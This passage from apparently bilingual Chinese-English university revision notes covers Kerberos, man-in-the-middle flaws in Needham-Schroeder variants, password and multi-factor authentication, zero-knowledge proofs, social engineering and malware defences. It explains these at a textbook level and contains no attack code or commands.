TGS}}}_{\text{AuthTicket}}\quad,\underbrace{\{A, T_2\}_{K_{A,TGS}}}_{\text{authenticator}}\quad, B$  </p><p>A向TGS出示来自过程2的AuthTicket和一个新的authenticator（寿命更短，由T2标记，服务器储存最新的authenticator为了防止重放攻击）</p></li><li><p>TGS -&gt; A: $\{K_{AB},B,T_3,\underbrace{\{A,B,K_{AB},T_3\}_{K_{B,TGS}}}_{\text{ServTicket}}\quad\}_{K_{A,TGS}}$</p><p>TGS给A颁发一个key $K_{AB}$（寿命T3）和一个新的票据ServTicket，这里$K_{B,TGS}$是TGS和B之间的共享key</p></li></ol><p>服务5，6 每个服务会话执行1次</p><ol><li><p>A -&gt; B: $\underbrace{\{A, B, K_{AB}, T_3\}_{K_{B,TGS}}}_{\text{ServTicket}}\quad, \underbrace{\{A, T_4\}_{K_{AB}}}_{\text{authenticator}}$ </p><p>A访问由B管理的资源，将来自过程4的票据和新的authenticator发给B（现实中，可能还有额外别的信息）</p></li><li><p>B -&gt; A: $\{T_4+1\}_{K_{AB}}$</p><p>B回应，授权使用服务</p></li></ol><h4 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h4><p>假如我登录KCL账户，想访问KCL library里没有的一本书（这本书在UCL或者MIT中有），则KCL服务器会与UCL或者MIT服务器交互</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f51.png" alt=""></p><p>过程3和4是向TGS请求访问远程TGS的票据而不是之前访问服务器的票据</p><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><ol><li><p>过程1：A -&gt; KAS: A, TGS </p><p>没有进行加密，攻击者可以对KAS服务器进行DOS攻击</p></li><li><p>KAS -&gt; A: $\{K_{A,TGS}, TGS, T_1, \underbrace{\{A, TGS, K_{A,TGS}, T_1\}_{K_{KAS, TGS}}}_{\text{AuthTicket}}\quad\}_{K_{AS}}$  </p><p>$\underbrace{\{A, TGS, K_{A,TGS}, T_1\}_{K_{KAS, TGS}}}_{\text{AuthTicket}}$ 又进行了$K_{AS}$的额外加密，多余，在版本5中被修改为$\{K_{A,TGS}, TGS, T_1\}_{K_{AS}}\{A, TGS, K_{A,TGS}, T_1\}_{K_{KAS, TGS}}$  </p></li></ol><h3 id="Quiz-4"><a href="#Quiz-4" class="headerlink" title="Quiz"></a>Quiz</h3><ol><li><p>描述NSPK的中间人攻击以及怎么修复</p><p>The man-in-the-middle attack to the Needham-Schroeder public key protocol works as follows:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f52.png" alt=""></p><p>A starts the protocol with another principal C, who however is an attacker. </p><p>C decrypts A’s message with his private key and encrypts it again with B’s public key and sends it to B, thus pretending to be A. </p><p>B replies by sending back the nonce NA and his own nonce NB encrypted with A’s public key. C cannot decrypt this message but can forward it to A, who accepts it as a valid reply to her initial message to C. This is because the nonces NA and NB are just numbers, with no information on who generated them.</p><p>A concludes her protocol with C by sending NB encrypted with C’s public key. C can decrypt this message and send NB to B, encrypted with B’s public key. </p><p>B decrypts the message and believes to have spoken (and agreed on NA, NB) with A.</p><p>The attack can be fixed by providing B’s name in the second message:</p><p>$B-&gt; A: \{NA, NB, B\}_{K_A}$</p><p>So, if C attempts the same attack:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f53.png" alt=""></p><p>C cannot decrypt B message and can only forward it to A, who will see that there is something wrong going on: she had sent her nonce NA to C but receives it back in a message sent by B. So, A aborts the protocol execution (or ignores the message).</p></li><li><p>解释Kerberos协议</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f54.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f55.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f56.png" alt=""></p></li><li><p>解释kerberos协议怎么一般化为多个realms的</p><p>A realm is defined by a Kerberos server. Server stores user and application server passwords for realm. </p><p>Large networks may be divided into administrative realms. </p><p>Kerberos supports inter-realm protocols. </p><ul><li><p>Servers register with each other. </p></li><li><p>For A to access B in another realm, the TGS in A’s realm receives request and grants ticket to access TGS in B’s realm. </p></li></ul><p>Protocol extension: two additional steps.</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f51.png" alt=""></p></li><li><p>A protocol specification is said to be non-executable when the principals cannot construct the messages that the protocol requires them to send. Consider the following variants of the Needham-Schroeder Public-Key Protocol and identify the ones that are not executable or that suffer from the man-in-the-middle attack.</p><blockquote><p>当委托人无法构建协议要求他们发送的信息时，就可以说协议规范是不可执行的。考虑以下Needham-Schroeder公钥协议的变体，找出不可执行的或遭受中间人攻击的变体</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f57.png" alt=""></p><p>Protocol 1 still suffers from the man-in-the-middle attack, since including A’s name in the first position in the first message does not help:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f58.png" alt=""></p><p>so that B believes to have spoken (and agreed on NA, NB) with A.</p><p>Protocol 2 still suffers from the man-in-the-middle attack, since including A’s name in the second message does not help:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f59.png" alt=""></p><p>so that B believes to have spoken (and agreed on NA, NB) with A.</p></li><li><p>对于协议3、协议4：</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f60.png" alt=""></p><p>Protocol 3 is simply not executable, since A does not know the private key $K^{-1}_B$ of B and hence cannot actually decrypt the second message and thus send the third message. </p><p>Protocol 4 still suffers from the man-in-the-middle attack, since including the recipient’s public key in the first message does not help as it is public anyway:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f61.png" alt=""></p><p>so that B believes to have spoken (and agreed on NA, NB) with A.</p></li><li><p>协议5、协议6</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f62.png" alt=""></p><p>Protocol 5 does not suffer from the man-in-the-middle attack as it includes the fix proposed by Lowe (in fact, protocol 3 is a simple extension of Lowe’s fix with A in the second and third message). </p><p>Protocol 6 still suffers from the man-in-the-middle attack, since B uses his private key to sign the second message, which is thus readable by everybody:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f63.png" alt=""></p><p>so that B believes to have spoken (and agreed on NA, NB) with A.</p></li><li><p>协议789</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f64.png" alt=""></p><p>Protocol 7 is not executable, since B does not know the private key $K^{-1}_A$ of A and hence cannot actually decrypt the third message. </p><p>Protocol 8 can be easily attacked since the attacker can decrypt every message using the public keys of A and B. </p><p>Protocol 9 still suffers from the man-in-the-middle attack, since including B’s name in the third message does not help:</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f65.png" alt=""></p><p>so that B believes to have spoken (and agreed on NA, NB) with A.</p></li><li><p>Alice wants to send to Bob a large file M (say, a movie of a few GBytes) in such a way that </p><ul><li><p>Bob is guaranteed of both the confidentiality and the integrity of the transmission, and that </p></li><li><p>the transmission is efficient. </p></li></ul><p>Alice and Bob have agreed previously on which cryptographic hash function they are going to use, and they know each other’s public keys. Which of the following procedures would be appropriate? </p><p>P1: Alice sends to Bob the encryption of M with her public key. </p><p>P2: Alice creates a new symmetric key K and sends to Bob a message containing: (i) the encryption with her private key of the hash of M, (ii) the encryption of M with K, and (iii) the encryption of K with Bob’s public key. </p><p>P3: Alice sends to Bob a message containing: (i) the encryption of M with Bob’s public key and (ii) the encryption with her private key of the hash of M. </p><p>P4: Alice sends to Bob a message containing: (i) the encryption with Bob’s private key of the hash of M and (ii) the encryption of M with her public key</p><p>solutions:</p><p>P1: Bob cannot decrypt the message as he does not possess Alice’s private key. </p><p>P2: Alice → Bob : $\{h(M)\}_{K_A^{-1}}$, $\{M\}_K$, $\{K\}_{K_B}$. This is the best of the four procedures as it does satisfy all the requirements. </p><p>P3: Alice → Bob : $\{M\}_{K_B}$ , $\{h(M)\}_{K_A^{-1}}$ . This does achieve confidentiality and integrity (although it would be better to include $\{M\}_{K_B}$ under $K_A^{-1}$ as well, i.e., to sign it as well), but does not achieve efficiency as a large message is encrypted with a large key (Bob’s public key). </p><p>P4: Alice does not possess Bob’s private key.</p></li></ol><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>Authentication is verification of identity of a person or system. </p><p>Some form of authentication is a pre-requisite if we wish to allow access to services or data to some people but deny access to others, using an access control system.</p><h3 id="强认证"><a href="#强认证" class="headerlink" title="强认证"></a>强认证</h3><p>Cryptographic challenge-response protocols: one entity (the claimant) “proves” its identity to another entity (the verifier) by demonstrating knowledge of a secret known to be associated with that entity, without revealing the secret itself to the verifier during the protocol. </p><p>This is done by providing a response to a time-variant challenge, where the response depends on both the entity’s secret and the challenge. </p><p>The challenge is typically a number chosen by one entity (randomly and secretly) at the outset of the protocol. </p><h3 id="弱认证"><a href="#弱认证" class="headerlink" title="弱认证"></a>弱认证</h3><p>Conventional password schemes involve time-invariant passwords, which provide so-called weak authentication. </p><p>Basic idea: </p><p>A password (typically a string of 6 to 10 or more characters) serves as a shared secret between the user and system. </p><p>User enters a (userid, password) pair, where userid is a claim of identity, and password is the evidence supporting the claim. </p><p>System checks that the password matches corresponding data it holds for that userid. </p><p>Demonstration of knowledge of this secret (by revealing the password itself) is accepted by the system as corroboration of the entity’s identity.</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f66.png" alt=""></p><p>通过比较密码的哈希值</p><p>这里即使某个密码的哈希值也和A密码的哈希值相同，也无所谓，因为攻击者并不知道谁与A密码的哈希值相同</p><h3 id="密码规则"><a href="#密码规则" class="headerlink" title="密码规则"></a>密码规则</h3><p>Passwords found in any on-line or available list of words may be uncovered by an adversary who tries all words in this list, using a so-called dictionary attack. </p><p>Since dictionary attacks are successful against predictable passwords, some systems impose password rules to discourage or prevent users from using “weak” passwords.</p><h4 id="entropy"><a href="#entropy" class="headerlink" title="entropy"></a>entropy</h4><p>Objective of password rules is to increase the entropy (rather than just length) of user passwords beyond the reach of dictionary and exhaustive search attacks. </p><p>Entropy here refers to the uncertainty in a password. </p><p>If all passwords are equally probable, then the entropy is maximal and equals the base-2 logarithm of the number of possible passwords. </p><p>While ideally arbitrary strings of n characters would be equiprobable as user-selected passwords, most (unrestricted) users select passwords from a small subset of the full password space (e.g., short passwords; dictionary words; proper names; lowercase strings). </p><p>Such weak passwords with low entropy are easily guessed. </p><p>Studies indicate that a large fraction of user-selected passwords are found in typical (intermediate) dictionaries of only 150000 words, while even a large dictionary of 250000 words represents only a tiny fraction of all possible n-character passwords.</p><h4 id="ageing-and-passphrases"><a href="#ageing-and-passphrases" class="headerlink" title="ageing and passphrases"></a>ageing and passphrases</h4><p>A time period is defined limiting the lifetime of each particular password (e.g., 30, 90 or 180 days). </p><p>This requires that passwords be changed periodically (and cannot be reused).</p><p>To allow greater entropy without stepping beyond the memory capacity of human users, passphrases may be used</p><p>Passphrase is hashed down to a fixed-size value, which plays the same role as a password. </p><p>Idea is that users can remember phrases easier than random character sequences. But it requires more typing.</p><h3 id="Personal-identification-numbers-PINs"><a href="#Personal-identification-numbers-PINs" class="headerlink" title="Personal identification numbers (PINs)"></a>Personal identification numbers (PINs)</h3><p>Personal identification numbers (PINs) fall under the category of fixed (time-invariant) passwords. </p><p>PINs are most often used in conjunction with “something possessed”, typically a physical token such as a plastic banking card with a magnetic stripe, or a chipcard. </p><p>To prove one’s identity as the authorized user of the token, and gain access to the privileges associated therewith, entry of the correct PIN is required when the token is used. </p><p>This provides a second level of security if the token is lost or stolen. </p><p>PINs may also serve as the second level of security for entry to buildings which have an independent first level of security (e.g., a security guard or video camera).</p><h3 id="Multi-factor-authentication-MFA"><a href="#Multi-factor-authentication-MFA" class="headerlink" title="Multi-factor authentication (MFA)"></a>Multi-factor authentication (MFA)</h3><p>Multi-factor authentication (MFA) is an authentication method in which a user has to successfully present authentication factors from at least two of the three categories: </p><p>knowledge factors (“things only the user knows”), such as passwords, </p><p>possession factors (“things only the user has”), such as ATM cards or smartphones,</p><p>inherence factors (“things only the user is”), such as biometrics. </p><p>Requiring more than one independent factor increases the difficulty of providing false credentials.</p><h3 id="One-time-passwords"><a href="#One-time-passwords" class="headerlink" title="One-time passwords"></a>One-time passwords</h3><p>A major security concern of fixed password schemes is eavesdropping and subsequent replay of the password. </p><p>A partial solution is one-time passwords: each password is used only once. </p><p>Such schemes are safe from passive adversaries who eavesdrop and later attempt impersonation. </p><p>Variations include: </p><p>Shared lists of one-time passwords: user and system use a sequence or set of t secret passwords, (each valid for a single authentication), distributed as a pre-shared list. </p><p>Sequentially updated one-time passwords: initially only a single secret password is shared, and then, during authentication using password i, user creates and transmits to system a new password (password i + 1) encrypted under a key derived from password i. </p><p>One-time password sequences based on a one-way function.</p><h2 id="Zero-knowledge-protocols"><a href="#Zero-knowledge-protocols" class="headerlink" title="Zero-knowledge protocols"></a>Zero-knowledge protocols</h2><p>In zero-knowledge proofs we can usually specify a statement that is being proved. </p><ul><li>Definitely, that statement is revealed to the verifier </li><li>The verifier (or others) should not learn anything else </li><li>Everybody can draw conclusions from everything they learned</li></ul><h3 id="Ali-Baba’s-cave"><a href="#Ali-Baba’s-cave" class="headerlink" title="Ali Baba’s cave"></a>Ali Baba’s cave</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f67.png" alt=""></p><p>洞穴中有一个只有当秘钥说对时才能打开的门，证明者Peggy想要向验证者Victor证明P知道秘钥，但是不想把秘钥内容暴露给V</p><ol><li>V站在洞穴入口，P走到门旁边</li><li>V走到洞穴的分岔口，对P大声说下面中的一个<ul><li>从A出来</li><li>从B出来</li></ul></li><li>P遵从命令，如果需要的话会打开门，按照命令从V说的路径出来</li><li>重复执行</li></ol><blockquote><p>假设P不知道秘钥，则每一轮只有1/2骗住V的机会，所以在n轮后P成功的几率会越来越小，为1/2的n次方</p></blockquote><h3 id="Fiat-Shamir-Identification-Protocol"><a href="#Fiat-Shamir-Identification-Protocol" class="headerlink" title="Fiat-Shamir Identification Protocol"></a>Fiat-Shamir Identification Protocol</h3><p>3个参与者：证明者P，验证者V，可信赖第三方T</p><p>初始：</p><p>T选择两个大质数p和q计算n=p×q，公开n，丢弃p和q</p><p>P选择一个秘钥s（在1到n-1之间），计算v=$s^2$ mod n，将v作为公钥</p><p>显然，由v计算s是很困难的</p><p>总共分为4步：</p><ol><li>P选择一个0到n-1的随机数r（叫做commitment），计算x=$r^2$ mod n（x叫做witness），把x发送给v</li><li>v把c发送给P，c叫做challenge，c要么是0要么是1</li><li>P计算response y = $r\times s^c$ mod n，发给v</li><li>V验证$y^2\ mod\ n\overset{?}{=}(x\times v^c)\ mod\ n$</li></ol><script type="math/tex; mode=display">y^2=_n{(r\times s^c)}^2=_nr^2\times s^{2c}=_nr^2\times (s^2)^c=_nx\times v^c</script><p>重复执行上面的4步</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f68.png" alt=""></p><h4 id="破解尝试"><a href="#破解尝试" class="headerlink" title="破解尝试"></a>破解尝试</h4><p>P不知道秘钥s，但是尝试证明its knowledge</p><p>P需要猜测V每次发送的c值</p><p>如果猜测是0，就发送x=$r^2$ mod n</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f69.png" alt=""></p><p>如果猜测是1，就发送x=$\frac{r^2}{v}$ mod n</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/cryptography/f70.png" alt=""></p><h3 id="Zero-Knowledge-Property"><a href="#Zero-Knowledge-Property" class="headerlink" title="Zero-Knowledge Property"></a>Zero-Knowledge Property</h3><p>Victor learns nothing except the proved statement.</p><p>V绝对不可能知道s的内容</p><h2 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h2><p>The acquisition of security-sensitive information or unauthorized access privileges by an outside attacker, based upon the abuse of a trust relationship (resulting possibly in the building of an inappropriate trust relationship with insiders). </p><p>In other words, it is the psychological manipulation of people into performing actions or into providing valuable information or access to confidential information.</p><h3 id="Human-based-social-engineering-impersonation"><a href="#Human-based-social-engineering-impersonation" class="headerlink" title="Human-based social engineering: impersonation"></a>Human-based social engineering: impersonation</h3><p>Important User: a common ploy is to pretend not to be only an employee, but an important user (e.g., a vice president, or even better: his/her secretary).  假装不只是一个雇员，而是一个重要的用户</p><ul><li>Help desk is less likely to turn down a request coming from a high-level official, or from a fellow employee under power pressure. Social engineer may threaten to report the employee to their supervisor. </li></ul><p>Third-party Authorization: social engineer may have obtained the name of someone in the organization who has authority to grant access to information. “Before he went on vacation, Mr. Big said I should call you to get this information.”  获得了组织中有权授予信息访问权限的某人的姓名</p><p>Tech Support: social engineer pretends to be someone from the infrastructure-support groups. The system is having a problem. We need to log on to test the connection.  假装是基础设施支持小组的人</p><h3 id="Computer-based-social-engineering-types"><a href="#Computer-based-social-engineering-types" class="headerlink" title="Computer-based social engineering: types"></a>Computer-based social engineering: types</h3><p>Mail attachments: Malware programs hidden in e-mail attachments (viruses, worms, “I love you”).  隐藏在电子邮件附件中的恶意程序</p><p>Websites: A common ploy is to offer something free or a chance to win a lottery on a website. To win requires an e-mail address and password, assuming, as is often the case, that victims will reuse their “standard” password.  在网站上提供一些免费的东西或一个中彩票的机会</p><p>Popup Windows: A window appears on the screen telling the victim he has lost his network connection and needs to reenter user name and password. A program will then e-mail the social engineer with the information.  屏幕上出现一个窗口，告诉受害者他已经失去了网络连接，需要重新输入用户名和密码</p><p>Fake wireless network: Social engineer sits in a hotel lobby, sets up a fake wireless network with an evocative name (e.g., using a minor variant of the hotel’s name). Victim logs in, assuming that it must be the real hotel’s wireless 社会工程师坐在酒店的大厅里，用一个引人联想的名字(例如，使用酒店名字的一个小变体)建立一个假的无线网络</p><h3 id="Phishing-SMiShing-Vishing"><a href="#Phishing-SMiShing-Vishing" class="headerlink" title="Phishing, SMiShing, Vishing"></a>Phishing, SMiShing, Vishing</h3><p>Phishing:</p><p>Attackers use Web-based services to launch attacks on those devices connected to the Web to acquire information such as usernames, passwords, and credit card details and other private data of the device owner by the intruder masquerading as a trustworthy friend in an electronic communication like e-mail and text. 利用基于Web的服务对连接到Web的设备发起攻击</p><p>SMiShing (= SMS + phishing):</p><p>A social engineering crime like phishing in that it uses the mobile devices and texts as baits to pull in the mobile device owner to divulge private and sometimes personal information. 利用移动设备和短信作为诱饵，引诱移动设备所有者泄露私人信息</p><p>Vishing (= voice + phishing):</p><p>It mostly uses the mobile device phone features facilitated by Voice over IP (VoIP) to gain access to private personal and financial information for the purpose of financial rewards. 主要使用由IP语音(VoIP)促进的移动设备电话功能，以获取私人的个人和财务信息，以获得财务奖励</p><h3 id="quiz-4"><a href="#quiz-4" class="headerlink" title="quiz"></a>quiz</h3><ol><li><p>Which of the following are commonly used to gain users’ passwords?</p><p>Hash inversion</p><p>Dictionary attacks</p><p>Social engineering</p><p>The correct answers are: Dictionary attacks, Social engineering</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> kcl复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>security-management-revision-0x02</title>
      <link href="/2021/12/10/security-management-revision-0x02/"/>
      <url>/2021/12/10/security-management-revision-0x02/</url>
      
        <content type="html"><![CDATA[<h2 id="Security-controls"><a href="#Security-controls" class="headerlink" title="Security controls"></a>Security controls</h2><p>Physical, Procedural and Technical can be used in three different “modes”</p><ul><li>preventative - stop an exploit from being exploited</li><li>detective - if something bad happens, the person in charge will be notified</li><li>reactive - we can perform a contingency plan to minimise the fallout from the exploit</li></ul><blockquote><ul><li>预防性 - 阻止漏洞被利用</li><li>侦查性–如果发生不好的事情，将通知负责人</li><li>反应性 - 我们可以执行应急计划，以尽量减少漏洞的影响</li></ul></blockquote><h3 id="Technical-controls"><a href="#Technical-controls" class="headerlink" title="Technical controls"></a>Technical controls</h3><h4 id="Types-of-malware"><a href="#Types-of-malware" class="headerlink" title="Types of malware"></a>Types of malware</h4><p><strong>Malware</strong> (MALicious softWARE) is the general term for software that threat agents use to gain and maintain access to computers. 威胁代理人用来获得和维持对计算机访问的软件的总称</p><h5 id="Virus"><a href="#Virus" class="headerlink" title="Virus"></a>Virus</h5><p>A virus is a piece of code like any other, however, it has a malicious intent. 病毒是一段与其他代码一样的代码，但是，它有恶意的意图</p><p>A virus can replicate itself freely within a system, but it usually requires intervention to infect other systems, such as executing a file. There are many routes to infection such as USB sticks, DVDs, email attachments, downloads from websites, local networks, and apps.</p><blockquote><p>病毒可以在系统内自由复制，但它通常需要干预才能感染其他系统，如执行一个文件。感染的途径有很多，如U盘、DVD、电子邮件附件、从网站下载、本地网络和应用程序</p></blockquote><p>Viruses range from very simple ones, such as those that delete files on a system, to very complex ones, such as Stuxnet which targeted and disabled nuclear fuel enrichment plants in Iran. </p><blockquote><p>病毒的范围从非常简单的病毒，如删除系统中的文件，到非常复杂的病毒，如针对伊朗的核燃料浓缩厂并使其失效的Stuxnet</p></blockquote><h5 id="Worm"><a href="#Worm" class="headerlink" title="Worm"></a>Worm</h5><p>Worms are viruses which actively distribute themselves. 主动传播自己的病毒</p><p>Worms actively exploit vulnerabilities in software or hardware, such as auto-execution in removable devices, and vulnerabilities in remote services.</p><blockquote><p>蠕虫会主动利用软件或硬件的漏洞，如可移动设备的自动执行，以及远程服务的漏洞</p></blockquote><h5 id="Trojan"><a href="#Trojan" class="headerlink" title="Trojan"></a>Trojan</h5><p>A trojan is any malware that misleads users of its true intent. 任何误导用户其真实意图的恶意软件</p><p>Trojans are usually attached to a legitimate program so that when a user executes it, the legitimate program seems to be working normally, however, under the hood there is what is called a ‘dropper’. This piece of code installs and runs malware without the user noticing or suspecting the trojan.</p><blockquote><p>木马通常附在一个合法程序上，这样当用户执行它时，合法程序似乎在正常工作，然而，在引擎盖下有一个所谓的 “投放器”。这段代码会在用户没有注意到或怀疑到木马的情况下安装和运行恶意软件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/security-management/f11.png"></p><h5 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h5><p>A way of bypassing a system’s normal authentication controls. 绕过系统的正常认证控制的一种方式</p><p>Backdoors are usually installed after a successful infection, for example, by means of a trojan. Backdoors can be installed through software or hardware.</p><blockquote><p>后门通常是在成功感染后安装的，例如，通过木马程序。后门可以通过软件或硬件安装</p></blockquote><p>The two main types of software backdoors are:</p><ol><li><p>A service running locally on a port accepting remote connections, eg an FTP server giving access to files on an infected machine.</p><blockquote><p>一个在本地运行的接受远程连接的端口的服务，例如一个允许访问受感染机器上的文件的FTP服务器</p></blockquote></li><li><p>A program running locally that connects to a remote service, then waits for further instructions.</p><blockquote><p>在本地运行的程序，连接到远程服务，然后等待进一步的指示</p></blockquote></li></ol><h5 id="Botnet"><a href="#Botnet" class="headerlink" title="Botnet"></a>Botnet</h5><p>A collection of infected computers with backdoors that are remotely controlled by a command and control centre.</p><p>Botnets can harvest the power of many infected machines to mine bitcoin, attack other computers, etc.</p><blockquote><p>由一个指挥和控制中心远程控制的带有后门的受感染计算机的集合</p><p>僵尸网络可以利用许多受感染机器的力量来挖掘比特币，攻击其他电脑等</p></blockquote><h5 id="Spyware"><a href="#Spyware" class="headerlink" title="Spyware"></a>Spyware</h5><p>Malware which steals information without the owner’s knowledge. 在所有者不知情的情况下窃取信息的恶意软件</p><p>Common examples of this kind of malware include software that records your <strong>internet activity</strong> and visited sites, <strong>records what you type</strong> on the keyboard with the hope of stealing passwords (keylogger), <strong>records through your webcam or laptop camera</strong> without your knowledge and spyware that records your <strong>messaging history</strong> (Skype, Whatsapp, etc).</p><blockquote><p>这类恶意软件的常见例子包括记录你的互联网活动和访问过的网站的软件，记录你在键盘上输入的内容，希望窃取密码（键盘记录器），在你不知情的情况下通过你的网络摄像头或笔记本电脑摄像头进行记录，以及记录你的信息记录的间谍软件（Skype，Whatsapp，等等）</p></blockquote><h5 id="Ransomware-赎金软件"><a href="#Ransomware-赎金软件" class="headerlink" title="Ransomware 赎金软件"></a>Ransomware 赎金软件</h5><p>Malware which blocks user access and threatens to delete data unless ransom is paid. 阻止用户访问并威胁要删除数据的恶意软件，除非支付赎金</p><h4 id="Controlling-and-preventing-malware"><a href="#Controlling-and-preventing-malware" class="headerlink" title="Controlling and preventing malware"></a>Controlling and preventing malware</h4><h5 id="Patch-software"><a href="#Patch-software" class="headerlink" title="Patch software"></a>Patch software</h5><p>The <strong>patching</strong> method relies on keeping software up to date. This method is not always obvious and it does not seem to be directly related to any form of specialist malware, however, malware exploits unpatched vulnerabilities in software. Even worse, when patches are released hackers reverse engineer patches to write malware which exploits the very vulnerability the patch was supposed to address.</p><blockquote><p>打补丁的方法依靠的是保持软件的更新。这种方法并不总是很明显，而且似乎与任何形式的专业恶意软件没有直接关系，然而，恶意软件利用的是软件中未打补丁的漏洞。更糟糕的是，当补丁发布时，黑客会对补丁进行逆向工程，编写恶意软件，利用该补丁应该解决的漏洞</p></blockquote><p>There is also a whole class of exploits called ‘zero-day vulnerabilities’. Those are vulnerabilities which are unreported and for which there is no patch.</p><blockquote><p>还有一整类被称为 “零日漏洞 “的漏洞。这些漏洞没有被报告，也没有补丁</p></blockquote><h5 id="Hardening"><a href="#Hardening" class="headerlink" title="Hardening"></a>Hardening</h5><p>Another control is ‘<strong>hardening</strong>’. This applies to operating systems and applications such as web browsers. Hardening is a collection of practices which aim to make infection less likely such as: 这适用于操作系统和应用程序，如网络浏览器。硬化是一系列旨在降低感染可能性的做法</p><ul><li>only installing necessary features or applications</li><li>not using default passwords or open configurations</li><li>disallowing installation of new software unless the user has admin privileges</li><li>limiting downloads to trusted sources only</li><li>not giving out admin privileges.</li></ul><blockquote><p>只安装必要的功能或应用程序<br>不使用默认密码或开放配置<br>除非用户有管理权限，否则不允许安装新的软件<br>仅将下载限制在受信任的来源<br>不给予管理员权限</p></blockquote><h5 id="Antivirus"><a href="#Antivirus" class="headerlink" title="Antivirus"></a>Antivirus</h5><p><strong>Antivirus</strong> software scans all files on the computer to detect if they look like a known virus. It then tries to quarantine the affected file or remove it. It also relies on being kept up to date, and of course, virus writers are smart and often write malware which can fight back.</p><blockquote><p>反病毒软件扫描计算机上的所有文件，以检测它们是否看起来像已知的病毒。然后，它试图隔离受影响的文件或删除它。它也依赖于保持更新，当然，病毒编写者很聪明，经常编写可以反击的恶意软件</p></blockquote><p>It can only protect against ‘seen’ malware, that is malware that has been recognised already. Furthermore, different companies will have different lists of malware and levels of protection will vary. Some vendors also offer the capability to discover new malware. For example, FireEye looks at undesired behaviour rather than analysing software.</p><blockquote><p>它只能防止 “看到的 “恶意软件，即已经被识别的恶意软件。此外，不同的公司会有不同的恶意软件清单，保护水平也会有所不同。一些供应商还提供发现新恶意软件的能力。例如，FireEye着眼于不受欢迎的行为，而不是分析软件</p></blockquote><h5 id="File-Integrity-Monitoring-FIM"><a href="#File-Integrity-Monitoring-FIM" class="headerlink" title="File Integrity Monitoring (FIM)"></a>File Integrity Monitoring (FIM)</h5><p>In FIM we keep track of the state of individuals’ files or the whole file system, and every unexpected change is seen as breaking integrity. This is particularly useful for keeping an eye on <strong>information assets</strong>. This is what a FIM process might look like:</p><blockquote><p>跟踪个人的文件或整个文件系统的状态，每一个意外的变化都被视为破坏完整性。这对于关注信息资产特别有用</p></blockquote><ol><li>Set policy</li></ol><p>Start by defining your policy, identifying which files on which devices need to be monitored. 从定义你的策略开始，确定哪些设备上的哪些文件需要被监控</p><ol start="2"><li>Baseline files</li></ol><p>Ensure the files you assess are in a known good state. This may involve evaluating versions, creation and modification dates, or any other file attributes. 确保你评估的文件处于一个已知的良好状态。这可能涉及评估版本、创建和修改日期，或任何其他文件属性 </p><ol start="3"><li>Monitor and reconcile changes</li></ol><p>A file might undergo hundreds of changes on a normal day on a single system. Knowing a good change from a bad one is essential. 在一个系统中，一个文件在正常的一天中可能会经历数百次的变化。知道一个好的变化和一个坏的变化是至关重要的 </p><ol start="4"><li>Alert</li></ol><p>When unauthorised changes are detected, focus on the highest priority alerts and take corrective action before more damage is done. 当检测到未经授权的更改时，关注最高优先级的警报，并在造成更多损害之前采取纠正措施</p><ol start="5"><li>Report</li></ol><p>FIM is required for PCI compliance and most other standards. Clear reports with the ability to drill-down are important both for operational processes and audit compliance. FIM是符合PCI和大多数其他标准的要求。清晰的报告和深入分析的能力对操作流程和审计合规性都很重要</p><h5 id="Host-Firewall-Intrusion-Detection-System"><a href="#Host-Firewall-Intrusion-Detection-System" class="headerlink" title="Host Firewall/Intrusion Detection System"></a>Host Firewall/Intrusion Detection System</h5><p>A host firewall, also known as a personal firewall, tries to enforce an ‘allow list’ of applications from the network/internet which are allowed to connect with a particular host (computer or device). Personal firewalls may also provide a level of <strong>intrusion detection</strong> by terminating or blocking connectivity where it suspects an intrusion is being attempted.</p><blockquote><p>主机防火墙，也被称为个人防火墙，试图从网络/互联网上执行一个允许与特定主机（计算机或设备）连接的应用程序的 “允许列表”。个人防火墙还可以提供一定程度的入侵检测，在它怀疑有人企图入侵时终止或阻止连接</p></blockquote><p>Unfortunately, if a system has been compromised by malware, the firewall may end up being bypassed or shut down entirely as both processes are running on the same system, potentially by the same user. A firewall also cannot notify if it has been incorrectly configured and it can possibly desensitise users to alerts by warning the user of actions that may not be 